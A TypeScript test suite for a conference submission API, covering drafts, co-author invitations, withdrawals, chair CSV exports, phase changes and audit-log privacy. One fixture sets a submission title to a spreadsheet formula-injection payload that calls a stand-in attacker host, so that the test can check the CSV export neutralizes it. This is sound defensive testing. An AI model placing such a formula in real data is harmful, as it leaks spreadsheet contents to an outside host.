import { findLeaks } from "@elochair/policy/testing";
import { conferences } from "@elochair/schema";
import { and, eq } from "drizzle-orm";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { auditLog, conflicts, contributions, people } from "./db/schema";
import { seedOpenCall } from "./fixtures";
import type { MemoryTransport } from "./mail";
import { createApiToken, getConference, grantRole, saveConference } from "./repo";
import { call, makeTestApp, personId, signIn, type TestApp } from "./testkit";

let t: TestApp;
let slug: string;
const words = (n: number, w = "verse") => Array.from({ length: n }, () => w).join(" ");
const AGREEMENTS =
  conferences.elo2027.agreements?.map((a) => ({ key: a.key, version: a.version })) ?? [];

/** Markers that must never appear in the audit log. */
const secrets: string[] = [];

async function person(email: string, name: string, languages = ["en"]) {
  const cookie = await signIn(t, email);
  const res = await call(t.public, "PUT", "/api/me/profile", {
    cookie,
    body: {
      displayName: name,
      affiliation: null,
      country: null,
      languages,
      pronouns: null,
      orcid: null,
      bios: {},
    },
  });
  expect(res.status).toBe(200);
  secrets.push(name, email);
  return cookie;
}

async function draft(cookie: string, typeKey = "talk") {
  const res = await call(t.public, "POST", `/api/conferences/${slug}/submissions`, {
    cookie,
    body: { typeKey, language: "en", participationMode: "in_person" },
  });
  expect(res.status).toBe(201);
  return res.json as { id: string; version: number };
}

async function fill(
  cookie: string,
  s: { id: string; version: number },
  title: string,
  abstract = words(260),
) {
  secrets.push(title, abstract.slice(0, 40));
  const res = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
    cookie,
    body: { version: s.version, title, abstract },
  });
  expect(res.status).toBe(200);
  return res.json as { id: string; version: number };
}

const submit = (cookie: string, s: { id: string; version: number }, agreements = AGREEMENTS) =>
  call(t.public, "POST", `/api/submissions/${s.id}/submit`, {
    cookie,
    body: { version: s.version, acceptedAgreements: agreements },
  });

const mailbox = () => t.deps.mail as MemoryTransport;
const mailTo = async (email: string) => {
  await call(t.public, "GET", `/api/_test/outbox/latest?to=${encodeURIComponent(email)}`);
  return mailbox().sent.filter((m) => m.to === email);
};

beforeAll(async () => {
  t = await makeTestApp();
  await saveConference(t.db, conferences.elo2027, "draft");
  ({ slug } = await seedOpenCall(t.db, { now: new Date("2027-02-01T12:00:00Z") }));
}, 120_000);
afterAll(() => t.close());

describe("creating and editing", () => {
  it("creates a draft owned by its creator; agents and the public cannot", async () => {
    const owner = await person("owner1@example.org", "Olga Owner");
    const s = await draft(owner);
    const got = await call(t.public, "GET", `/api/submissions/${s.id}`, { cookie: owner });
    expect(got.json.view).toBe("submitter");
    expect(got.json.contributors).toEqual([
      expect.objectContaining({
        status: "confirmed",
        role: "lead",
        isOwner: true,
        displayName: "Olga Owner",
      }),
    ]);
    expect(
      (
        await call(t.public, "POST", `/api/conferences/${slug}/submissions`, {
          body: { typeKey: "talk", language: "en" },
        })
      ).status,
    ).toBe(401);
    const k = await getConference(t.db, slug);
    await grantRole(t.db, {
      conferenceId: k!.id,
      personId: await personId(t, "owner1@example.org"),
      role: "chair",
    });
    const { token } = await createApiToken(t.db, {
      personId: await personId(t, "owner1@example.org"),
      conferenceId: k!.id,
      tier: "M",
      name: "x",
    });
    const byAgent = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      token,
      body: { version: 1, title: "x" },
    });
    expect(byAgent.status).toBe(403);
    expect(byAgent.json.error).toBe("agents_read_only");
  });

  it("refuses stale versions and oversized text, even in drafts", async () => {
    const owner = await person("owner2@example.org", "Pat Owner");
    const s = await draft(owner);
    const ok = await fill(owner, s, "A first title");
    const stale = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: s.version, title: "Lost update" },
    });
    expect(stale.status).toBe(409);
    expect(stale.json).toEqual({ error: "stale", version: ok.version });
    const huge = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: ok.version, abstract: "x".repeat(2401) },
    });
    expect(huge.status).toBe(422);
    expect(huge.json.issues[0]).toMatchObject({ path: "abstract", code: "too_long" });
    const unknownKey = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: ok.version, ownerPersonId: "x" },
    });
    expect(unknownKey.status).toBe(400);
  });

  it("only the owner can edit; a stranger gets 404, a chair 403", async () => {
    const owner = await person("owner3@example.org", "Quinn Owner");
    const s = await draft(owner);
    const stranger = await person("stranger@example.org", "Sam Stranger");
    expect(
      (
        await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
          cookie: stranger,
          body: { version: 1, title: "x" },
        })
      ).status,
    ).toBe(404);
  });
});

describe("submitting", () => {
  it("needs valid content and the current agreements; sends receipts once", async () => {
    const owner = await person("owner4@example.org", "Rosa Owner", ["es"]);
    let s = await draft(owner);
    s = await fill(owner, s, "Electronic poems by the sea");
    const noAgreements = await submit(owner, s, []);
    expect(noAgreements.status).toBe(422);
    expect(noAgreements.json.issues).toContainEqual({
      path: "agreements",
      code: "agreements_required",
    });

    const [a, b] = await Promise.all([submit(owner, s), submit(owner, s)]);
    expect([a.status, b.status].sort()).toEqual([200, 403]);
    const receipts = (await mailTo("owner4@example.org")).filter((m) =>
      m.subject.includes("propuesta recibida"),
    );
    expect(receipts).toHaveLength(1);
    const ok = a.status === 200 ? a : b;
    expect(ok.json.submission.status).toBe("submitted");
    expect(ok.json.check.presenterCap).toEqual({ count: 1, max: 2 });
  });

  it("refuses an edit that would make submitted work invalid, but allows returning to draft", async () => {
    const owner = await person("owner5@example.org", "Tomás Owner");
    let s = await draft(owner);
    s = await fill(owner, s, "Hypertext gardens");
    const sub = await submit(owner, s);
    const v = sub.json.submission.version;
    const broken = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: v, abstract: "too short" },
    });
    expect(broken.status).toBe(422);
    const typeChange = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: v, typeKey: "workshop" },
    });
    expect(typeChange.json.issues).toContainEqual({ path: "typeKey", code: "locked" });
    const back = await call(t.public, "POST", `/api/submissions/${s.id}/unsubmit`, {
      cookie: owner,
      body: { version: v },
    });
    expect(back.json.status).toBe("draft");
  });
});

describe("invitations", () => {
  it("answers identically whether or not the invitee has an account, and creates a conflict", async () => {
    const owner = await person("owner6@example.org", "Uma Owner");
    const existing = await person("existing@example.org", "Real Profile Name");
    void existing;
    let s = await draft(owner);
    s = await fill(owner, s, "Collaborative fiction");
    const inviteAs = async (email: string, version: number) =>
      call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
        cookie: owner,
        body: {
          version,
          email,
          role: "coauthor",
          name: "Typed Name",
          affiliation: "Typed Org",
          lang: "en",
        },
      });
    const a = await inviteAs("existing@example.org", s.version);
    expect(a.status).toBe(201);
    const shown = a.json.contributors.find((c: { status: string }) => c.status === "invited");
    expect(shown).toMatchObject({
      displayName: "Typed Name",
      affiliation: "Typed Org",
      email: "existing@example.org",
    });
    expect(findLeaks(a.json, ["Real Profile Name"])).toEqual([]);

    const b = await inviteAs("brand-new@example.org", a.json.version);
    const shownNew = b.json.contributors.filter((c: { status: string }) => c.status === "invited");
    expect(shownNew[1]).toMatchObject({ displayName: "Typed Name", affiliation: "Typed Org" });

    const pid = await personId(t, "existing@example.org");
    const conflict = await t.db
      .select()
      .from(conflicts)
      .where(and(eq(conflicts.personId, pid), eq(conflicts.submissionId, s.id)));
    expect(conflict).toHaveLength(1);
    const [row] = await t.db.select().from(people).where(eq(people.email, "brand-new@example.org"));
    expect(row?.displayName).toBeNull(); // nothing the owner typed went into a profile
  });

  it("the invitation email carries no submission title, and the link lets the invitee confirm", async () => {
    const owner = await person("owner7@example.org", "Vera Owner");
    let s = await draft(owner);
    s = await fill(owner, s, "SECRET-TITLE-7 a title of the owner's");
    await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: { version: s.version, email: "coauthor7@example.org", role: "presenter", lang: "es" },
    });
    const [mail] = (await mailTo("coauthor7@example.org")).slice(-1);
    expect(mail?.text).not.toContain("SECRET-TITLE-7");
    expect(mail?.subject).toContain("confirma tu participación");
    const token = /#token=([A-Za-z0-9_-]+)/.exec(mail?.text ?? "")?.[1] as string;

    const info = await call(t.public, "POST", "/api/invitations/info", { body: { token } });
    expect(info.json).toMatchObject({
      title: "SECRET-TITLE-7 a title of the owner's",
      role: "presenter",
      ownerName: "Vera Owner",
    });
    const noConsent = await call(t.public, "POST", "/api/invitations/answer", {
      body: { token, answer: "confirm" },
    });
    expect(noConsent.status).toBe(422);
    const yes = await call(t.public, "POST", "/api/invitations/answer", {
      body: {
        token,
        answer: "confirm",
        acceptedAgreements: AGREEMENTS,
        displayName: "Wen Coauthor",
      },
    });
    expect(yes.json).toEqual({ answer: "confirmed" });
    expect(
      (
        await call(t.public, "POST", "/api/invitations/answer", {
          body: { token, answer: "decline" },
        })
      ).status,
    ).toBe(400);
    const ownerMail = (await mailTo("owner7@example.org")).at(-1);
    expect(ownerMail?.subject).toMatch(/confirmed/);
    const coauthorRow = await t.db
      .select()
      .from(people)
      .where(eq(people.email, "coauthor7@example.org"));
    expect(coauthorRow[0]?.displayName).toBe("Wen Coauthor");
  });

  it("someone who declines sees nothing afterwards and cannot be re-invited", async () => {
    const owner = await person("owner8@example.org", "Xavi Owner");
    let s = await draft(owner);
    s = await fill(owner, s, "A panel about bots");
    const inv = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: { version: s.version, email: "decliner@example.org", role: "coauthor", lang: "en" },
    });
    const decliner = await signIn(t, "decliner@example.org");
    const pending = await call(t.public, "GET", "/api/me/invitations", { cookie: decliner });
    expect(pending.json.items).toHaveLength(1);
    expect(pending.json.items[0].submission.view).toBe("invitee");
    expect(findLeaks(pending.json, ["owner8@example.org"])).toEqual([]); // invitees see no emails
    const no = await call(t.public, "POST", `/api/me/invitations/${s.id}/answer`, {
      cookie: decliner,
      body: { answer: "decline" },
    });
    expect(no.json.answer).toBe("declined");
    expect(
      (await call(t.public, "GET", `/api/submissions/${s.id}`, { cookie: decliner })).status,
    ).toBe(404);
    const again = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: {
        version: inv.json.version + 1,
        email: "decliner@example.org",
        role: "coauthor",
        lang: "en",
      },
    });
    expect(again.json.issues).toContainEqual({ path: "email", code: "declined_cannot_reinvite" });
  });

  it("limits invitations per recipient address and enforces the team size", async () => {
    const owners = await Promise.all(
      [0, 1, 2, 3, 4, 5].map((i) => person(`spam-owner${i}@example.org`, `Spam Owner ${i}`)),
    );
    const statuses: number[] = [];
    for (const o of owners) {
      const s = await draft(o);
      const r = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
        cookie: o,
        body: { version: s.version, email: "target@example.org", role: "coauthor", lang: "en" },
      });
      statuses.push(r.status);
    }
    expect(statuses).toEqual([201, 201, 201, 201, 201, 429]);

    const owner = await person("teamowner@example.org", "Team Owner");
    let s = await draft(owner); // talk: at most 4 people
    for (let i = 0; i < 3; i++) {
      const r = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
        cookie: owner,
        body: { version: s.version, email: `team${i}@example.org`, role: "coauthor", lang: "en" },
      });
      s = r.json;
    }
    const fifth = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: { version: s.version, email: "team9@example.org", role: "coauthor", lang: "en" },
    });
    expect(fifth.json.issues[0]).toMatchObject({ code: "team_size" });
  });
});

describe("leaving", () => {
  it("a confirmed co-author can leave at any time; the owner is told; they then see nothing", async () => {
    const owner = await person("owner-leave@example.org", "Lea Owner");
    let s = await draft(owner);
    s = await fill(owner, s, "Leaving is allowed");
    await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: {
        version: s.version,
        email: "leaver@example.org",
        role: "presenter",
        name: "Lee Leaver",
        lang: "en",
      },
    });
    const leaver = await signIn(t, "leaver@example.org");
    await call(t.public, "POST", `/api/me/invitations/${s.id}/answer`, {
      cookie: leaver,
      body: { answer: "confirm", acceptedAgreements: AGREEMENTS, displayName: "Lee Leaver" },
    });
    t.setNow(new Date("2027-03-10T12:00:00Z")); // even after the close
    try {
      const again = await signIn(t, "leaver@example.org");
      expect(
        (
          await call(t.public, "POST", `/api/submissions/${s.id}/leave`, {
            cookie: again,
            body: {},
          })
        ).status,
      ).toBe(204);
      expect(
        (await call(t.public, "GET", `/api/submissions/${s.id}`, { cookie: again })).status,
      ).toBe(404);
      expect((await mailTo("owner-leave@example.org")).at(-1)?.subject).toMatch(/Lee Leaver left/);
    } finally {
      t.setNow(new Date("2027-02-01T12:00:00Z"));
    }
  });
});

describe("profiles, checks, and closing", () => {
  it("refuses profile updates that try to change email or id", async () => {
    const cookie = await person("profile@example.org", "Pro File");
    const res = await call(t.public, "PUT", "/api/me/profile", {
      cookie,
      body: {
        displayName: "x",
        affiliation: null,
        country: null,
        languages: [],
        pronouns: null,
        orcid: null,
        bios: {},
        email: "chair@example.org",
      },
    });
    expect(res.status).toBe(400);
    const [row] = await t.db.select().from(people).where(eq(people.email, "profile@example.org"));
    expect(row?.displayName).toBe("Pro File");
  });

  it("the check is for contributors and chairs only, and shows only the viewer's own cap", async () => {
    const owner = await person("checker@example.org", "Chuck Checker");
    let s = await draft(owner);
    s = await fill(owner, s, "Mentions Chuck Checker by name", `${words(250)} Chuck Checker`);
    const check = await call(t.public, "GET", `/api/submissions/${s.id}/check`, { cookie: owner });
    expect(check.json.selfIdentification).toContainEqual({ path: "abstract", kind: "name" });
    expect(check.json.presenterCap).toEqual({ count: 1, max: 2 });
    const stranger = await signIn(t, "stranger2@example.org");
    expect(
      (await call(t.public, "GET", `/api/submissions/${s.id}/check`, { cookie: stranger })).status,
    ).toBe(404);
  });

  it("after the close: no editing, but withdrawing still works", async () => {
    let owner = await person("closer@example.org", "Clo Ser");
    let s = await draft(owner);
    s = await fill(owner, s, "Closing time");
    const sub = await submit(owner, s);
    t.setNow(new Date("2027-03-10T12:00:00Z")); // after the close (opened Jan 31 + 30 days)
    try {
      owner = await signIn(t, "closer@example.org"); // a fresh session at the new time
      const edit = await call(t.public, "PATCH", `/api/submissions/${s.id}`, {
        cookie: owner,
        body: { version: sub.json.submission.version, title: "late" },
      });
      expect(edit.status).toBe(409);
      expect(edit.json.error).toBe("call_closed");
      const wd = await call(t.public, "POST", `/api/submissions/${s.id}/withdraw`, {
        cookie: owner,
        body: { version: sub.json.submission.version },
      });
      expect(wd.json.status).toBe("withdrawn");
      const contact = await mailTo(conferences.elo2027.contactEmail);
      expect(contact.at(-1)?.subject).toMatch(/withdrawn/);
    } finally {
      t.setNow(new Date("2027-02-01T12:00:00Z"));
    }
  });

  it("deleting a draft tells pending invitees and leaves nothing behind", async () => {
    const owner = await person("deleter@example.org", "Del Eter");
    const s = await draft(owner);
    const inv = await call(t.public, "POST", `/api/submissions/${s.id}/contributors`, {
      cookie: owner,
      body: { version: s.version, email: "told@example.org", role: "coauthor", lang: "pt" },
    });
    const del = await call(t.public, "DELETE", `/api/submissions/${s.id}`, {
      cookie: owner,
      body: { version: inv.json.version },
    });
    expect(del.status).toBe(204);
    expect(
      (await call(t.public, "GET", `/api/submissions/${s.id}`, { cookie: owner })).status,
    ).toBe(404);
    expect((await mailTo("told@example.org")).at(-1)?.subject).toMatch(/convite foi cancelado/);
  });
});

describe("chairs: lists, exports and phases", () => {
  let chairCookie: string;
  beforeAll(async () => {
    chairCookie = await person("the-chair@example.org", "The Chair");
    const k = await getConference(t.db, slug);
    await grantRole(t.db, {
      conferenceId: k!.id,
      personId: await personId(t, "the-chair@example.org"),
      role: "admin",
    });
    const owner = await person("csv-owner@example.org", "Csv Owner");
    let s = await draft(owner);
    s = await fill(owner, s, '=HYPERLINK("https://evil.example/?"&A1,"click")');
    await submit(owner, s);
  });

  it("exports CSV with formula injection neutralized, a BOM, and an audit row", async () => {
    const res = await t.public.request(`/api/conferences/${slug}/submissions.csv`, {
      headers: { cookie: chairCookie },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("cache-control")).toBe("no-store");
    const bytes = new Uint8Array(await res.arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]); // UTF-8 byte order mark
    const text = new TextDecoder().decode(bytes);
    expect(text).toContain(`"'=HYPERLINK(""https://evil.example/?""&A1,""click"")"`);
    const rows = await t.db
      .select()
      .from(auditLog)
      .where(eq(auditLog.action, "submissions.exported"));
    expect(rows.at(-1)?.details).toMatchObject({ kind: "submissions" });
    const contribs = await t.public.request(`/api/conferences/${slug}/contributors.csv`, {
      headers: { cookie: chairCookie },
    });
    expect(await contribs.text()).toContain("csv-owner@example.org");
  });

  it("refuses CSV to cloud (tier M) agents, and title search to tier M", async () => {
    const k = await getConference(t.db, slug);
    const { token } = await createApiToken(t.db, {
      personId: await personId(t, "the-chair@example.org"),
      conferenceId: k!.id,
      tier: "M",
      name: "m",
    });
    expect(
      (await call(t.public, "GET", `/api/conferences/${slug}/submissions.csv`, { token })).status,
    ).toBe(403);
    const q = await call(t.public, "GET", `/api/conferences/${slug}/submissions?q=poems`, {
      token,
    });
    expect(q.status).toBe(400);
    expect(q.json.error).toBe("q_not_allowed");
    const list = await call(
      t.public,
      "GET",
      `/api/conferences/${slug}/submissions?status=submitted`,
      { token },
    );
    expect(list.json.items.every((i: { view: string }) => i.view === "metadata")).toBe(true);
    expect(findLeaks(list.json, secrets)).toEqual([]);
  });

  it("moves phases forward only, unless forced with a reason", async () => {
    const back = await call(t.public, "PUT", `/api/conferences/${slug}/phase`, {
      cookie: chairCookie,
      body: { phase: "draft" },
    });
    expect(back.status).toBe(200); // draft ⇄ cfp_open is allowed
    await call(t.public, "PUT", `/api/conferences/${slug}/phase`, {
      cookie: chairCookie,
      body: { phase: "reviewing" },
    });
    const refused = await call(t.public, "PUT", `/api/conferences/${slug}/phase`, {
      cookie: chairCookie,
      body: { phase: "cfp_open" },
    });
    expect(refused.status).toBe(409);
    const forced = await call(t.public, "PUT", `/api/conferences/${slug}/phase`, {
      cookie: chairCookie,
      body: { phase: "cfp_open", force: true, reason: "Reopened for the dry run" },
    });
    expect(forced.status).toBe(200);
  });
});

describe("the audit log", () => {
  it("never holds titles, abstracts, names or emails written during these flows", async () => {
    const rows = await t.db.select().from(auditLog);
    expect(rows.length).toBeGreaterThan(20);
    expect(
      findLeaks(
        rows,
        secrets.filter((x) => x.length > 6),
      ),
    ).toEqual([]);
  });
});

void contributions;
